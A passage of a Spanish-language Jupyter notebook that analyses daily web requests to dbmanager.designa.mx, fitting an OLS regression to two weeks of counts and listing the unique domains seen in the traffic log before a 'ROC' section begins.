    "# Inferencia por verosimilitud"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 72,
   "id": "9f52513f-12de-4bda-8c42-c9706bda4f79",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "<Axes: title={'center': 'Distribución de trafico total en dbmanager.designa.mx por dia'}, xlabel='Fecha', ylabel='Total de peticiones'>"
      ]
     },
     "execution_count": 72,
     "metadata": {},
     "output_type": "execute_result"
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 1000x800 with 1 Axes>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    " \t\n",
    "df['domain'] \\\n",
    "    .eq('dbmanager.designa.mx') \\\n",
    "    .astype(int) \\\n",
    "    .groupby(df['fdate']) \\\n",
    "    .sum() \\\n",
    "    .plot(title=\"Distribución de trafico total en dbmanager.designa.mx por dia\", xlabel=\"Fecha\", ylabel=\"Total de peticiones\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 26,
   "id": "b6a7ed32-41c5-43be-8b3b-06be26f981ad",
   "metadata": {},
   "outputs": [],
   "source": [
    "freq_dbm = df['domain'] \\\n",
    "    .eq('dbmanager.designa.mx') \\\n",
    "    .astype(int) \\\n",
    "    .groupby(df['fdate']) \\\n",
    "    .sum() "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 27,
   "id": "b1eb64dc-b711-4898-8232-ad8e5e5c2682",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "fdate\n",
       "2023-06-13      6\n",
       "2023-06-14      1\n",
       "2023-06-15      0\n",
       "2023-06-16    135\n",
       "2023-06-17      0\n",
       "2023-06-18      1\n",
       "2023-06-19      0\n",
       "2023-06-20      9\n",
       "2023-06-21      1\n",
       "2023-06-22      4\n",
       "2023-06-23      2\n",
       "2023-06-24      1\n",
       "2023-06-25      2\n",
       "2023-06-26      0\n",
       "2023-06-27      3\n",
       "Name: domain, dtype: int64"
      ]
     },
     "execution_count": 27,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "#df.query(\"domain == 'dbmanager.designa.mx' and fdate == '2023-06-16'\")\n",
    "freq_dbm"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 28,
   "id": "3782eacd-5a9c-48e5-9e49-2bae5e271338",
   "metadata": {},
   "outputs": [],
   "source": [
    "test = pd.DataFrame({\"sum\":freq_dbm, \"mdate\": np.arange(1,len(freq_dbm)+1,1)})"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 29,
   "id": "6c1785f2-35a1-4475-a28d-f5066bbb9802",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>sum</th>\n",
       "      <th>mdate</th>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>fdate</th>\n",
       "      <th></th>\n",
       "      <th></th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>2023-06-13</th>\n",
       "      <td>6</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2023-06-14</th>\n",
       "      <td>1</td>\n",
       "      <td>2</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2023-06-15</th>\n",
       "      <td>0</td>\n",
       "      <td>3</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2023-06-16</th>\n",
       "      <td>135</td>\n",
       "      <td>4</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2023-06-17</th>\n",
       "      <td>0</td>\n",
       "      <td>5</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2023-06-18</th>\n",
       "      <td>1</td>\n",
       "      <td>6</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2023-06-19</th>\n",
       "      <td>0</td>\n",
       "      <td>7</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2023-06-20</th>\n",
       "      <td>9</td>\n",
       "      <td>8</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2023-06-21</th>\n",
       "      <td>1</td>\n",
       "      <td>9</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2023-06-22</th>\n",
       "      <td>4</td>\n",
       "      <td>10</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2023-06-23</th>\n",
       "      <td>2</td>\n",
       "      <td>11</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2023-06-24</th>\n",
       "      <td>1</td>\n",
       "      <td>12</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2023-06-25</th>\n",
       "      <td>2</td>\n",
       "      <td>13</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2023-06-26</th>\n",
       "      <td>0</td>\n",
       "      <td>14</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2023-06-27</th>\n",
       "      <td>3</td>\n",
       "      <td>15</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "            sum  mdate\n",
       "fdate                 \n",
       "2023-06-13    6      1\n",
       "2023-06-14    1      2\n",
       "2023-06-15    0      3\n",
       "2023-06-16  135      4\n",
       "2023-06-17    0      5\n",
       "2023-06-18    1      6\n",
       "2023-06-19    0      7\n",
       "2023-06-20    9      8\n",
       "2023-06-21    1      9\n",
       "2023-06-22    4     10\n",
       "2023-06-23    2     11\n",
       "2023-06-24    1     12\n",
       "2023-06-25    2     13\n",
       "2023-06-26    0     14\n",
       "2023-06-27    3     15"
      ]
     },
     "execution_count": 29,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "test"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 30,
   "id": "c0aa246e-f594-493e-8b4c-291f00bef264",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Requirement already satisfied: statsmodels in /usr/local/lib/python3.11/dist-packages (0.14.2)\n",
      "Requirement already satisfied: numpy>=1.22.3 in /usr/local/lib/python3.11/dist-packages (from statsmodels) (1.26.4)\n",
      "Requirement already satisfied: scipy!=1.9.2,>=1.8 in /usr/local/lib/python3.11/dist-packages (from statsmodels) (1.13.1)\n",
      "Requirement already satisfied: pandas!=2.1.0,>=1.4 in /usr/local/lib/python3.11/dist-packages (from statsmodels) (2.2.2)\n",
      "Requirement already satisfied: patsy>=0.5.6 in /usr/local/lib/python3.11/dist-packages (from statsmodels) (0.5.6)\n",
      "Requirement already satisfied: packaging>=21.3 in /usr/local/lib/python3.11/dist-packages (from statsmodels) (23.2)\n",
      "Requirement already satisfied: python-dateutil>=2.8.2 in /usr/local/lib/python3.11/dist-packages (from pandas!=2.1.0,>=1.4->statsmodels) (2.9.0.post0)\n",
      "Requirement already satisfied: pytz>=2020.1 in /usr/local/lib/python3.11/dist-packages (from pandas!=2.1.0,>=1.4->statsmodels) (2024.1)\n",
      "Requirement already satisfied: tzdata>=2022.7 in /usr/local/lib/python3.11/dist-packages (from pandas!=2.1.0,>=1.4->statsmodels) (2024.1)\n",
      "Requirement already satisfied: six in /usr/lib/python3/dist-packages (from patsy>=0.5.6->statsmodels) (1.16.0)\n",
      "\u001b[33mWARNING: Running pip as the 'root' user can result in broken permissions and conflicting behaviour with the system package manager. It is recommended to use a virtual environment instead: https://pip.pypa.io/warnings/venv\u001b[0m\u001b[33m\n",
      "\u001b[0m"
     ]
    }
   ],
   "source": [
    "!pip install statsmodels"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 31,
   "id": "b818d8e7-d65d-4b54-bad3-c892959b748a",
   "metadata": {},
   "outputs": [],
   "source": [
    "# import the necessary libraries\n",
    "#import numpy as np\n",
    "#import pandas as pd\n",
    "#from matplotlib import pyplot as plt\n",
    "import seaborn as sns\n",
    "from statsmodels import api\n",
    "#from scipy import stats\n",
    "#from scipy.optimize import minimize"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 32,
   "id": "6c13000b-baee-4b8b-a132-532f7aaf6eef",
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "/usr/local/lib/python3.11/dist-packages/scipy/stats/_axis_nan_policy.py:531: UserWarning: kurtosistest only valid for n>=20 ... continuing anyway, n=15\n",
      "  res = hypotest_fun_out(*samples, **kwds)\n"
     ]
    },
    {
     "data": {
      "text/html": [
       "<table class=\"simpletable\">\n",
       "<caption>OLS Regression Results</caption>\n",
       "<tr>\n",
       "  <th>Dep. Variable:</th>           <td>sum</td>       <th>  R-squared:         </th> <td>   0.063</td>\n",
       "</tr>\n",
       "<tr>\n",
       "  <th>Model:</th>                   <td>OLS</td>       <th>  Adj. R-squared:    </th> <td>  -0.009</td>\n",
       "</tr>\n",
       "<tr>\n",
       "  <th>Method:</th>             <td>Least Squares</td>  <th>  F-statistic:       </th> <td>  0.8722</td>\n",
       "</tr>\n",
       "<tr>\n",
       "  <th>Date:</th>             <td>Sat, 15 Jun 2024</td> <th>  Prob (F-statistic):</th>  <td> 0.367</td> \n",
       "</tr>\n",
       "<tr>\n",
       "  <th>Time:</th>                 <td>08:27:53</td>     <th>  Log-Likelihood:    </th> <td> -73.349</td>\n",
       "</tr>\n",
       "<tr>\n",
       "  <th>No. Observations:</th>      <td>    15</td>      <th>  AIC:               </th> <td>   150.7</td>\n",
       "</tr>\n",
       "<tr>\n",
       "  <th>Df Residuals:</th>          <td>    13</td>      <th>  BIC:               </th> <td>   152.1</td>\n",
       "</tr>\n",
       "<tr>\n",
       "  <th>Df Model:</th>              <td>     1</td>      <th>                     </th>     <td> </td>   \n",
       "</tr>\n",
       "<tr>\n",
       "  <th>Covariance Type:</th>      <td>nonrobust</td>    <th>                     </th>     <td> </td>   \n",
       "</tr>\n",
       "</table>\n",
       "<table class=\"simpletable\">\n",
       "<tr>\n",
       "    <td></td>       <th>coef</th>     <th>std err</th>      <th>t</th>      <th>P>|t|</th>  <th>[0.025</th>    <th>0.975]</th>  \n",
       "</tr>\n",
       "<tr>\n",
       "  <th>const</th> <td>   26.4286</td> <td>   18.776</td> <td>    1.408</td> <td> 0.183</td> <td>  -14.134</td> <td>   66.991</td>\n",
       "</tr>\n",
       "<tr>\n",
       "  <th>mdate</th> <td>   -1.9286</td> <td>    2.065</td> <td>   -0.934</td> <td> 0.367</td> <td>   -6.390</td> <td>    2.533</td>\n",
       "</tr>\n",
       "</table>\n",
       "<table class=\"simpletable\">\n",
       "<tr>\n",
       "  <th>Omnibus:</th>       <td>35.696</td> <th>  Durbin-Watson:     </th> <td>   2.364</td>\n",
       "</tr>\n",
       "<tr>\n",
       "  <th>Prob(Omnibus):</th> <td> 0.000</td> <th>  Jarque-Bera (JB):  </th> <td>  68.055</td>\n",
       "</tr>\n",
       "<tr>\n",
       "  <th>Skew:</th>          <td> 3.079</td> <th>  Prob(JB):          </th> <td>1.67e-15</td>\n",
       "</tr>\n",
       "<tr>\n",
       "  <th>Kurtosis:</th>      <td>11.425</td> <th>  Cond. No.          </th> <td>    19.3</td>\n",
       "</tr>\n",
       "</table><br/><br/>Notes:<br/>[1] Standard Errors assume that the covariance matrix of the errors is correctly specified."
      ],
      "text/latex": [
       "\\begin{center}\n",
       "\\begin{tabular}{lclc}\n",
       "\\toprule\n",
       "\\textbf{Dep. Variable:}    &       sum        & \\textbf{  R-squared:         } &     0.063   \\\\\n",
       "\\textbf{Model:}            &       OLS        & \\textbf{  Adj. R-squared:    } &    -0.009   \\\\\n",
       "\\textbf{Method:}           &  Least Squares   & \\textbf{  F-statistic:       } &    0.8722   \\\\\n",
       "\\textbf{Date:}             & Sat, 15 Jun 2024 & \\textbf{  Prob (F-statistic):} &    0.367    \\\\\n",
       "\\textbf{Time:}             &     08:27:53     & \\textbf{  Log-Likelihood:    } &   -73.349   \\\\\n",
       "\\textbf{No. Observations:} &          15      & \\textbf{  AIC:               } &     150.7   \\\\\n",
       "\\textbf{Df Residuals:}     &          13      & \\textbf{  BIC:               } &     152.1   \\\\\n",
       "\\textbf{Df Model:}         &           1      & \\textbf{                     } &             \\\\\n",
       "\\textbf{Covariance Type:}  &    nonrobust     & \\textbf{                     } &             \\\\\n",
       "\\bottomrule\n",
       "\\end{tabular}\n",
       "\\begin{tabular}{lcccccc}\n",
       "               & \\textbf{coef} & \\textbf{std err} & \\textbf{t} & \\textbf{P$> |$t$|$} & \\textbf{[0.025} & \\textbf{0.975]}  \\\\\n",
       "\\midrule\n",
       "\\textbf{const} &      26.4286  &       18.776     &     1.408  &         0.183        &      -14.134    &       66.991     \\\\\n",
       "\\textbf{mdate} &      -1.9286  &        2.065     &    -0.934  &         0.367        &       -6.390    &        2.533     \\\\\n",
       "\\bottomrule\n",
       "\\end{tabular}\n",
       "\\begin{tabular}{lclc}\n",
       "\\textbf{Omnibus:}       & 35.696 & \\textbf{  Durbin-Watson:     } &    2.364  \\\\\n",
       "\\textbf{Prob(Omnibus):} &  0.000 & \\textbf{  Jarque-Bera (JB):  } &   68.055  \\\\\n",
       "\\textbf{Skew:}          &  3.079 & \\textbf{  Prob(JB):          } & 1.67e-15  \\\\\n",
       "\\textbf{Kurtosis:}      & 11.425 & \\textbf{  Cond. No.          } &     19.3  \\\\\n",
       "\\bottomrule\n",
       "\\end{tabular}\n",
       "%\\caption{OLS Regression Results}\n",
       "\\end{center}\n",
       "\n",
       "Notes: \\newline\n",
       " [1] Standard Errors assume that the covariance matrix of the errors is correctly specified."
      ],
      "text/plain": [
       "<class 'statsmodels.iolib.summary.Summary'>\n",
       "\"\"\"\n",
       "                            OLS Regression Results                            \n",
       "==============================================================================\n",
       "Dep. Variable:                    sum   R-squared:                       0.063\n",
       "Model:                            OLS   Adj. R-squared:                 -0.009\n",
       "Method:                 Least Squares   F-statistic:                    0.8722\n",
       "Date:                Sat, 15 Jun 2024   Prob (F-statistic):              0.367\n",
       "Time:                        08:27:53   Log-Likelihood:                -73.349\n",
       "No. Observations:                  15   AIC:                             150.7\n",
       "Df Residuals:                      13   BIC:                             152.1\n",
       "Df Model:                           1                                         \n",
       "Covariance Type:            nonrobust                                         \n",
       "==============================================================================\n",
       "                 coef    std err          t      P>|t|      [0.025      0.975]\n",
       "------------------------------------------------------------------------------\n",
       "const         26.4286     18.776      1.408      0.183     -14.134      66.991\n",
       "mdate         -1.9286      2.065     -0.934      0.367      -6.390       2.533\n",
       "==============================================================================\n",
       "Omnibus:                       35.696   Durbin-Watson:                   2.364\n",
       "Prob(Omnibus):                  0.000   Jarque-Bera (JB):               68.055\n",
       "Skew:                           3.079   Prob(JB):                     1.67e-15\n",
       "Kurtosis:                      11.425   Cond. No.                         19.3\n",
       "==============================================================================\n",
       "\n",
       "Notes:\n",
       "[1] Standard Errors assume that the covariance matrix of the errors is correctly specified.\n",
       "\"\"\""
      ]
     },
     "execution_count": 32,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "features = api.add_constant(test[\"mdate\"])\n",
    "model = api.OLS(test[\"sum\"], features).fit()\n",
    "model.summary()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 33,
   "id": "3f3a9105-a1d4-42c5-af76-606bf2716213",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "32.16889950306189"
      ]
     },
     "execution_count": 33,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "res = model.resid\n",
    "standard_dev = np.std(res)\n",
    "standard_dev"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 87,
   "id": "0a37c6b6-29e2-483f-8def-f2c406fb4d66",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 1000x800 with 1 Axes>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "plt.subplots() \n",
    "sns.regplot(x='mdate', y='sum', data = test)\n",
    "# Set label for x-axis \n",
    "plt.xlabel( \"Fecha\" , size = 12 ) \n",
    "  \n",
    "# Set label for y-axis \n",
    "plt.ylabel( \"Total de peticiones\" , size = 12 ) \n",
    "  \n",
    "# Set title for plot \n",
    "plt.title( \"Inferencia por verosimilitud de peticiones en dbmanager.designa.mx al día\" , size = 12) \n",
    "plt.show()"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "a3a6874d-29c3-4d49-b03c-abac5d771e5c",
   "metadata": {},
   "source": [
    "# ROC"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 35,
   "id": "b24d6ca5-e73a-4570-8e9e-17b9ab5a0979",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "array(['', 'nextcloud-sader.designa.mx', 'www.latinaer.org',\n",
       "       'moodle.ucags.edu.mx', 'accounts.google.com', 'www.google.com',\n",
       "       'localhost', 'servicios.ieec.mx', 'www.ieec.mx',\n",
       "       '158.69.255.11:80', 'ojs.latinaer.org', 'com.google.android.gm',\n",
       "       'aprendizajes.ieec.mx', 'latinaer.org', 'sii.upa.edu.mx',\n",
       "       'cdn.designa.mx', 'sites.google.com', 'reportesusmef.net',\n",
       "       'cms.designa.mx', 'accounts.google.com.mx', 'intranet.upa.edu.mx',\n",
       "       'pbr.upa.edu.mx', 'www.mindmeister.com', 'sis.cij.gob.mx',\n",
       "       'ieec.mx', 'www.cide-edna.org', 'mx.search.yahoo.com',\n",
       "       'comunidadaprende.edu.mx', 'web.whatsapp.com',\n",
       "       'www.comunidadaprende.edu.mx', 'www.aguasvoyalcentro.com',\n",
       "       'puntoderecarga.mx', 'dbmanager.designa.mx', 'www.google.com.mx',\n",
       "       'baidu.com', 'scholar.google.com.pe', 'upa.edu.mx',\n",
       "       'outlook.office.com', 'sader.designa.mx',\n",
       "       'stage.puntoderecarga.mx', 'experiencia21.tec.mx',\n",
       "       'www.petalsearch.com', 'search-dra.dt.dbankcloud.com',\n",
       "       'br.images.search.yahoo.com', 'www.incmty.com',\n",
       "       'share.hsforms.com', 'www.canva.com', 'www.bing.com',\n",
       "       'www.remove.bg', 'titulacion.upa.edu.mx', 'repo.designa.mx',\n",
       "       'simplesite.com', 'scholar.google.com', 'stage.upa.edu.mx',\n",
       "       'leakix.net', 'cide-edna.org', 'classroom.google.com',\n",
       "       'mail.google.com', 'www.ecosia.org',\n",
       "       'sistemadeaccionescorrectivas.upa.edu.mx',\n",
       "       'stage.aguasvoyalcentro.com', 'linktr.ee',\n",
       "       'comunidadaprende.org.mx', 'www.cindyshome.store', 'www.google.es',\n",
       "       'scholar.google.es', 'ports.designa.mx', 'aguasvoyalcentro.com',\n",
       "       'www.designa.mx', 'ofertademanda.designa.mx', 'cursos.designa.mx',\n",
       "       'videotec.americansoftwoodsmexico.com', 'phpmyadmin.designa.mx',\n",
       "       'mw.designa.mx', 'com.slack', 'micuenta.infonavit.org.mx',\n",
       "       'cuevano.designa.mx', 'www.google.co.jp', 'accounts.blogger.com',\n",
       "       'auth.mastermanual.mx', 'megawatt.com.mx', 'id.search.yahoo.com',\n",
       "       'espacios.upa.edu.mx', 'myactivity.google.com',\n",
       "       'www.designamx.com', '158.69.255.11:443', 'www.mailboost.io',\n",
       "       'designamx.com', 'smowl.net', 'www.tiktok.com', 'www.youtube.com',\n",
       "       'platzi.com', 'scholar.lanfanshu.cn', 'inventariousmef.com.mx',\n",
       "       'autismojaen.es', 'www.scimagojr.com', 'bancaribe.wordpress.com',\n",
       "       'uniteconline.blackboard.com', 'api-enterateya.designa.mx',\n",
       "       'cloudbox.designa.mx', 'bookstack.designa.mx',\n",
       "       'unademo.designa.mx', 'www.scopus.com', 'sitquije.com',\n",
       "       'inventariodemo.designa.mx', 'formaciondocentes.designa.mx',\n",
       "       'repodemo.designa.mx', 'scholar.google.de',\n",
       "       'nextcloud.usmeatlive.mx', 'ghost-rider', 'designa.mx',\n",
       "       'scholar.google.co.cr', 'www-latinaer-org.translate.goog',\n",
       "       'm.facebook.com', 'view.officeapps.live.com', 'www.google.nl',\n",
       "       'www.elheraldodechihuahua.com.mx', 'korbel.du.edu',\n",
       "       'www.intranet.cij.gob.mx',\n",
       "       'jovenesconstruyendoelfuturo.stps.gob.mx', 'www.juegosjuegos.ws',\n",
       "       'www.juegos.com', 'www.mederi.com.co', 'workona.com',\n",
       "       'outlook.office365.com', 'REPORTESUSMEF.NET', 'easyseo.s-nac.com',\n",
       "       'daten-quadrat.de', 'www.cs.hmc.edu', 'scholar.google.com.br',\n",
       "       'stagesistemadeaccionescorrectivas.upa.edu.mx',\n",
       "       'staffstage.usmeatlive.mx', 'www.ambientesvirtuales.org.mx',\n",
       "       'www.mastermanual.mx', 'inscripciones.uca.mx',\n",
       "       'stageespacios.upa.edu.mx', 'mastermanual.mx', 'acitronmoda.com',\n",
       "       'ambientesvirtuales.org.mx', 'whatsapp-queue.designa.mx',\n",
       "       'stage.puntoderecarga.mx:443', 'puntoderecarga.mx:443',\n",
       "       'www.dof.gob.mx', 'nitter.pussthecat.org', 'www.netflix.com',\n",
       "       '158.69.255.11', 'lens.google.com', 'educacion.nexos.com.mx',\n",
       "       'ojs.latinaer.org:443', 'l.instagram.com', 'scholar.google.com.ar',\n",
       "       'serviciosdigitales.imss.gob.mx', 'www.infobae.com',\n",
       "       'linea4deinfonavit.com', 'duckduckgo.com', 'www.ilovepdf.com',\n",
       "       'mx.computrabajo.com', 'www.google.com.co', 'www.google.co.in',\n",
       "       'www.corazonyvida.org', 'www.inmens.es', 'awenpsicologia.com',\n",
       "       'senspsicologia.com', 'hominummexico.com', 'adolescenciasema.org',\n",
       "       'www.formajoven.org', 'orcid.org', 'sc.panda321.com',\n",
       "       'www.doaj.org', 'www.google.com.hk', 'pic.sogou.com',\n",
       "       'onlinelibrary.wiley.com', 'sci-hub.se', 'www.tandfonline.com',\n",
       "       'academic.oup.com', 'www.ncbi.nlm.nih.gov', 'web.s.ebscohost.com',\n",
       "       'www.pnas.org', 'link.springer.com', 'scholar.google.com.mx',\n",
       "       '172.24.132.61', 'latinaer.org:443', 'www.google.fr',\n",
       "       'www.chemcalc.org', 'fiehnlab.ucdavis.edu', 'democrm.designa.mx',\n",
       "       'pubchem.ncbi.nlm.nih.gov', 'picsoci.com', 'www.mybib.com',\n",
       "       'investiga.banrep.gov.co', 'doi.org', 'menteplus.com',\n",
       "       'tecmx-my.sharepoint.com',\n",
       "       'fc7jk4ac4t.search.serialssolutions.com', 'fnsm.designa.mx',\n",
       "       'aprendizajes.ieec.mx.', 'kaniskadam.weebly.com',\n",
       "       'www.ethelsblog.online', 'l.facebook.com', 'mitec.itesm.mx',\n",
       "       'www.google.com.br', 'market.tec.mx',\n",
       "       'com.google.android.googlequicksearchbox', 'www.sciencedirect.com',\n",
       "       'wordwall.net', 'www.google.com.tw', 'www.elsoldelcentro.com.mx',\n",
       "       'www.marketingandweb.es', 'educapuntes.blogspot.com',\n",
       "       'es.slideshare.net', 'www.lifeder.com', 'www.ride.org.mx',\n",
       "       'eprints.rclis.org', 'www.sep.gob.mx', 'www.significados.com',\n",
       "       'www.uniprot.org', 'yandex.ru', 'causanatura.designa.mx',\n",
       "       'www.cell.com', 'enzyme.expasy.org', 'pubmed.ncbi.nlm.nih.gov',\n",
       "       'plantmethods.biomedcentral.com', 'www.reportesusmef.net',\n",
       "       'www.snapgene.com', 'www.addgene.org', 'apsjournals.apsnet.org',\n",
       "       'www.scielo.org.mx', 'benchling.com', 'www.scielo.sa.cr',\n",
       "       'www.researchgate.net', 'en.vectorbuilder.com', 'discord.com',\n",
       "       'www.arenapublica.com', 'itesm.zoom.us',\n",
       "       'pdf.sciencedirectassets.com', 'www.arabidopsis.org',\n",
       "       'www.jstage.jst.go.jp', 'org.telegram.messenger',\n",
       "       'edna.designa.mx', '48hourgraphics.com', 'www.usmeatlive.mx',\n",
       "       'sare.designa.mx', 'www.scielo.org.co', 'www.elmueble.com',\n",
       "       'www.expertoanimal.com', 'es.point.pet', 'www.twinkl.com.mx',\n",
       "       'es.wikipedia.org', 'portalwireless.tec.mx', 'parts.igem.org',\n",
       "       'goldbio.com', 'www.nature.com',\n",
       "       'currentprotocols.onlinelibrary.wiley.com',\n",
       "       'www.seg.guanajuato.gob.mx', 'protocolexchange.researchsquare.com',\n",
       "       'app.diagrams.net', 'brxt.mendeley.com', 'journals.plos.org',\n",
       "       'www.aeaweb.org', 'apimock.upa.edu.mx', 'www.mexicoevalua.org',\n",
       "       'www.americanpharmaceuticalreview.com', 'www.pharmtech.com',\n",
       "       'ashpublications.org', 'www.baidu.com',\n",
       "       'www.hidrocalidodigital.com', 'repositorio-digital.cide.edu',\n",
       "       'hot.newsfeed.intl.miui.com', 'www.econbiz.de', 'www.sat.gob.mx',\n",
       "       'www.imss.gob.mx', 'api.bsdpay.net', 'transfer.qbitspay.net',\n",
       "       'asiescancun.mx', 'catalogonacional.gob.mx', 'www.google.com.pe',\n",
       "       'www.primevideo.com', 'www.amazon.com.mx', 'www.whole-search.com',\n",
       "       'images.search.yahoo.com', 'www.google.co.kr',\n",
       "       'appassets.androidplatform.net', 'search.brave.com',\n",
       "       'plagscan.com', 'www-fr-redi-bw-de.ezproxy.ub.uni-marburg.de',\n",
       "       'mx.images.search.yahoo.com', 'office.aeapubs.org',\n",
       "       'www.google.ru', 'americansoftwoodslatam.com', '192.168.2.225',\n",
       "       'www.washingtonpost.com', 'www.megawatt.com.mx',\n",
       "       'r.search.yahoo.com', 'www.skymem.info', 'bit.ly',\n",
       "       'www.econstor.eu', 't.co', 'www.gstatic.com',\n",
       "       'es.search.yahoo.com', 'aulas.udemex.edu.mx',\n",
       "       'conexion.digitalnet.net.mx', 'web.flow.opera.com',\n",
       "       'www.roter-punkt-kamera.de', 'revistas.ufps.edu.co',\n",
       "       'sii.upa.edu.mx.', 'www.webofscience.com', 'reportes.upa.edu.mx',\n",
       "       'www-webofscience-com.ezproxy2.ucn.cl', 'daazlwgp35.feishu.cn',\n",
       "       'www.elfinanciero.com.mx', 'threadreaderapp.com', 'www.google.de',\n",
       "       'app.brandwatch.com', 'amfs.tec.mx', 'scholar.google.com.pr',\n",
       "       'www.letpub.com.cn', 'us06web.zoom.us', 'searchmenow.gg',\n",
       "       'reliefweb.int', 'www.oecd.org', 'theirworld.org', 'www.zawya.com',\n",
       "       'finance.yahoo.com', 'open.spotify.com', 'www.edweek.org',\n",
       "       'lal.ngo', 'www.childrenontheedge.org', 'www.nabu.org',\n",
       "       'inventarium.mx', 'supermetrics.com', 'www.cae.net',\n",
       "       'www.top10onlinecolleges.org', 'www.springer.com',\n",
       "       'corp.kaltura.com', 'howtogermany.com', 'teaching.cornell.edu',\n",
       "       'kuioo.es', 'kahoot.it', 'kahoot.com', 'byjus.com', 'www.caib.es',\n",
       "       'psicologiaymente.com', 'www.insp.mx', 'nida.nih.gov',\n",
       "       'repository.ces.edu.co', 'www.medigraphic.com', 'www.nafin.com',\n",
       "       'www.masferriol.com', 'www.google.cl',\n",
       "       'www.voluntarios.cij.gob.mx', 'outlook.live.com',\n",
       "       'us05web.zoom.us', 'login.brandwatch.com', 'loscurricanes.mx',\n",
       "       'cdn.qr-code-generator.com', 'restaurantlosarcos.com',\n",
       "       'www.opentable.com.mx', 'es.restaurantguru.com', 'www.campomar.mx',\n",
       "       'cabanna.com.mx', 'www.unotv.com', 'www.linkedin.com',\n",
       "       'eldezmorningyalgomas.blogspot.com', 'moodle.tuc.edu.mx',\n",
       "       'www.todamateria.com', 'tutfg.es', 'tesisymasters.mx',\n",
       "       'definicion.de', 'www.zendesk.com.mx', 'www.pinterest.com.mx',\n",
       "       'LATINAER.ORG', 'accounts.google.com.pe', 'jmp.spi-global.com',\n",
       "       'domain.com', 'usmeatlive.mx', 'www.atube.me',\n",
       "       'leticiapalomeque.com', 'clinicaperezespinosa.com', 'pks.dk',\n",
       "       'scholar.google.cl', '127.0.0.1', 'publicaciones.anuies.mx',\n",
       "       'archivos.diputados.gob.mx', 'rieoei.org', 'politica.expansion.mx',\n",
       "       'revistas.bancomext.gob.mx', 'www.redalyc.org', 'cee.edu.mx',\n",
       "       'ensech.edu.mx', 'www.sev.gob.mx', 'repositorio.cepal.org',\n",
       "       'inehrm.gob.mx', 'www.ts.ucr.ac.cr', 'www.uv.mx',\n",
       "       'morena.senado.gob.mx', 'www.gob.mx', 'www.domaininfofree.com',\n",
       "       'www.wizardingworld.com', 'www.ivanesalud.com', 'www.idrlabs.com',\n",
       "       'lingokids.com', 'teams.microsoft.com', 'genial.ly',\n",
       "       'mjl.clarivate.com', 'sanjosei.conalep-guanajuato.edu.mx',\n",
       "       'chemcalc.org', 'theglobalamericans.org', 'sedici.unlp.edu.ar',\n",
       "       'sandbox.cryptpad.info', 'wh6xb6dc4n.search.serialssolutions.com',\n",
       "       'scholar.google.com.ec', 'scholar.google.ru', 'revistamentor.ec',\n",
       "       'stage.usmeatlive.mx', 'cuevana3.eu', 'watchadsfree.com',\n",
       "       'prophydrint.com', 'www.caliente.mx', 'cuevana8.com.',\n",
       "       'CIDE-EDNA.ORG'], dtype=object)"
      ]
     },
     "execution_count": 35,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df[\"domain\"].unique()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 36,
